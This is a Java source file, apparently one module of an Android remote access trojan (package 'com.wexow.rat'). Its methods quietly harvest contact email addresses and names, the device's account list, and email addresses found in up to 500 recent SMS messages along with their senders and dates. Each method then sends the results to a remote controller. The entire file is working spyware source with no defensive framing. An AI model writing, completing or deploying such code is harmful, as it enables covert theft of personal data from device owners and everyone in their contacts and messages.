package com.wexow.rat.managers;

import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

import com.wexow.rat.core.ConnectionManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashSet;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class EmailExtractor {
    private static final String TAG = "EmailExtractor";

    public static void extractContactEmails(Context ctx) {
        new Thread(() -> {
            try {
                JSONArray emails = new JSONArray();
                Set<String> seen = new HashSet<>();

                Cursor c = ctx.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                    new String[]{
                        ContactsContract.CommonDataKinds.Email.ADDRESS,
                        ContactsContract.CommonDataKinds.Email.TYPE,
                        ContactsContract.CommonDataKinds.Email.DISPLAY_NAME
                    },
                    null, null,
                    ContactsContract.CommonDataKinds.Email.DISPLAY_NAME + " ASC");

                if (c != null) {
                    while (c.moveToNext()) {
                        String addr = c.getString(0);
                        if (addr == null || addr.isEmpty()) continue;
                        if (!seen.add(addr.toLowerCase())) continue;

                        JSONObject e = new JSONObject();
                        e.put("email", addr);
                        e.put("name", c.getString(2));
                        e.put("type", c.getInt(1));
                        emails.put(e);
                    }
                    c.close();
                }

                JSONObject res = new JSONObject();
                res.put("type", "contact_emails");
                res.put("count", emails.length());
                res.put("data", emails);
                ConnectionManager.send(res.toString());
                Log.d(TAG, "Extracted " + emails.length() + " contact emails");
            } catch (Exception e) {
                Log.e(TAG, "extractContactEmails: " + e.getMessage());
            }
        }).start();
    }

    public static void extractAccounts(Context ctx) {
        new Thread(() -> {
            try {
                JSONArray accounts = new JSONArray();
                AccountManager am = AccountManager.get(ctx);
                Account[] accs = am.getAccounts();

                for (Account a : accs) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", a.name);
                    jo.put("type", a.type);
                    accounts.put(jo);
                }

                JSONObject res = new JSONObject();
                res.put("type", "device_accounts");
                res.put("count", accounts.length());
                res.put("data", accounts);
                ConnectionManager.send(res.toString());
            } catch (Exception e) {
                Log.e(TAG, "extractAccounts: " + e.getMessage());
            }
        }).start();
    }

    public static void extractEmailsFromSms(Context ctx) {
        new Thread(() -> {
            try {
                JSONArray found = new JSONArray();
                Set<String> seen = new HashSet<>();
                Pattern emailPattern = Pattern.compile(
                    "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");

                Cursor c = ctx.getContentResolver().query(
                    Uri.parse("content://sms/"),
                    new String[]{"address", "body", "date"},
                    null, null, "date DESC LIMIT 500");

                if (c != null) {
                    while (c.moveToNext()) {
                        String body = c.getString(1);
                        if (body == null) continue;

                        Matcher m = emailPattern.matcher(body);
                        while (m.find()) {
                            String email = m.group();
                            if (seen.add(email.toLowerCase())) {
                                JSONObject jo = new JSONObject();
                                jo.put("email", email);
                                jo.put("sender", c.getString(0));
                                jo.put("date", c.getLong(2));
                                found.put(jo);
                            }
                        }
                    }
                    c.close();
                }

                JSONObject res = new JSONObject();
                res.put("type", "sms_emails");
                res.put("count", found.length());
                res.put("data", found);
                ConnectionManager.send(res.toString());
            } catch (Exception e) {
                Log.e(TAG, "extractEmailsFromSms: " + e.getMessage());
            }
        }).start();
    }

    public static void extractAll(Context ctx) {
        extractContactEmails(ctx);
        extractAccounts(ctx);
        extractEmailsFromSms(ctx);
    }
}